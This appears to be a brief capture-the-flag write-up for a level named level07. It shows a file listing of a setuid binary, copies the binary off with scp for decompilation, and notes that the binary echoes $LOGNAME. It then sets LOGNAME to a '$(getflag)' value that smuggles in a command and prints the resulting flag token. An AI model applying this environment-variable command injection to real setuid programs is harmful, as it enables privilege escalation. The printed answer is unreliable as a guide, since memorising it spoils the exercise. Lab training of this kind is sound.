# Flag07

```bash
ll
dr-x------ 1 level07 level07  120 Mar  5  2016 ./
d--x--x--x 1 root    users    340 Aug 30  2015 ../
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout*
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc*
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07*
-r-x------ 1 level07 level07  675 Apr  3 
```

We scp ```level7``` into our local to put him into ```dogbolt```

```bash
scp -P 4241 level07@localhost:/home/user/level07/level07 level07
```

We can see that the bin exec ```echo $LOGNAME```

```bash
export LOGNAME="\$(getflag)"
```

```bash
./level07
```

that yield us: ```fiumuikeil55xe9cu4dood66h```
